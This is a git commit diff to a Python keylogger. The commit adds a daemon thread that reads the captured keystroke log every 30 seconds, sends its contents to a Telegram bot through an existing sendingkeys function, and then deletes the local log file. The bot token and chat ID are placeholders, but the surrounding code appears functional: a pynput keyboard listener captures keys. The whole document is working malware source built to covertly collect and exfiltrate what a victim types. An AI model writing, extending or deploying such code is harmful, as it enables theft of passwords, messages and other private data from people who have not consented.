8530fe03d90193e9e891f7257308174656d1f41f
DoubleY <141092504+y44li@users.noreply.github.com>
2025-12-09 10:30:44 +0100

    Add threaded function to send logs every 30 seconds

--- keylogger.py
+++ keylogger.py
@@ -6,6 +6,7 @@ telegram_bot_token = "REPLACE_YOUR_TOKEN"
 chatID = "your_chat_id_here"
 
 
+LOG_FILE = "path_File"
 
 
 def OnPress(key) : # Define the function for handling key presses
@@ -27,12 +28,36 @@ def sendingkeys(message):
         print("Response:", r.text)
     except Exception as e:
         print("Something went wrong:", e)
+
+
+
+def report_logs():
+    while True:
+        try:
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE, 'r') as f:
+                    log_contents = f.read()
+
+                if log_contents:                 # send only if not empty
+                    sendingkeys(log_contents)
+                    os.remove(LOG_FILE)          # delete file only after sending
+
+        except Exception as e:
+            print("Error:", e)
+
+        time.sleep(30)  # wait 30s 
+
+# start background thread
+t = threading.Thread(target=report_logs)
+t.daemon = True    # thread closes when main program closes
+t.start()
             
     
 # Create the keyboard listener with `on_press` handler       
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
+
 
 
 
